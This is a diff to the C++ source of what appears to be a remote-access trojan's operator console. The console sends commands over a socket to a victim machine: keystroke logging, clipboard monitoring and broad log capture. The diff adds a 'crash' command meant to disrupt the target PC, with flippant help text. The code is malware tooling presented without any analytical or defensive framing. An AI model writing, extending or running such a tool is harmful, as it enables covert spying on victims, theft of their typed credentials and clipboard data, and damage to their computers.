@@ -31,6 +31,7 @@ int cmd(const char *str) {
     else if (!strcmp(str, "keylogger")) return 1;
     else if (!strcmp(str, "cliplogger")) return 1;
     else if (!strcmp(str, "all_log")) return 1;
+    else if (!strcmp(str, "crash")) return 1;
     else if (!strcmp(str, "!q")) return 1;
     else if (!strcmp(str, "help")) {
         std::cout << "Command List" << std::endl;
@@ -38,6 +39,7 @@ int cmd(const char *str) {
         std::cout << "\tkeylogger  - get the characters you entered" << std::endl;
         std::cout << "\tcliplogger - clipboard monitoring" << std::endl;
         std::cout << "\tall_log    - monitor almost all logs" << std::endl;
+        std::cout << "\tcrash      - makes pc go crazy" << std::endl;
         return 2;
     }
     else if (!strcmp(str, "")) return 2;
@@ -111,6 +113,10 @@ int main() {
         else if (!strcmp(send_buf, "all_log")) {
             std::cout << BLUE << "\nLogging started.\n" << NC << std::endl;
             keylog(connect, recv_buf);
+        }
+        else if (!strcmp(send_buf, "crash")) {
+            std::cout << BLUE << "\nMy pc was destroyed lol.\n" << NC << std::endl;
+            break;
         }
 
         recv(connect, recv_buf, sizeof(recv_buf), 0);
